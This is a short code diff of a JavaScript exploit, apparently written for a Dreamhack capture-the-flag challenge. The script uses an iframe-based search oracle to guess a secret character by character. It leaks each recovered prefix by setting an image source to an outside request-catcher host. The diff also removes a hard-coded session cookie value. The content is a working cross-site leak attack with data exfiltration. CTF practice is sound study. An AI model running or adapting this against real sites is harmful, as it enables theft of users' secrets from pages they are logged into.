@@ -4,10 +4,9 @@
     async function req(url) {
         return await new Promise((resolve, reject) => {
             const iframe = document.getElementById("iframe");
-            window.localStorage.setItem('session', 'eyJpc0FkbWluIjpmYWxzZSwidXNlcm5hbWUiOiIxIn0.ZbDy9A.mDBhclIxdigq5jmDTw_VJB9DDoc');
             iframe.src = url;
             iframe.onload = () => { 
-                var divElement = iframe.querySelector('.sentence-list');
+                var divElement = iframe.contentDocument.querySelector('.sentence-list');
                 var ulElement = divElement.querySelector('ul');
                 var liElement = ulElement.querySelector('li');
                 if (liElement != 0)
@@ -34,7 +33,7 @@
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://tlkhnne.request.dreamhack.games/${secret}`;
+                    img.src = `https://rsenlgs.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
